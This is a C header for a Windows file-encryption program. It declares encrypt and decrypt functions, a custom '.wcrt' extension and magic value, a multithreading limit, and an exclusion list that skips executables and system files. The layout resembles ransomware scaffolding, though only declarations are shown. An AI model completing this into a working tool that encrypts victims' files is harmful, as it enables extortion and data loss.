#pragma once
#ifndef CRYPTO_H
#define CRYPTO_H

#include <windows.h>

#define KEY_SIZE            32
#define NONCE_SIZE          12
#define MAX_THREADS         8
#define ENCRYPT_EXT         L".wcrt"   
#define ENCRYPT_MAGIC       0x54524357 // W C R T 
#define BLACKLISTED_EXTS	L".exe", L".dll", L".sys", L".msi", L".ini", ENCRYPT_EXT, NULL


#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}


typedef struct _ENCRYPTED_FILE_HEADER {
    DWORD Signature;
    BYTE Key[KEY_SIZE];
    BYTE Nonce[NONCE_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;


void EncryptSingleFile(LPCWSTR wPath);
void DecryptSingleFile(LPCWSTR wPath);
BOOL IsBlacklistedExtension(LPCWSTR wFileName);

#endif // CRYPTO_H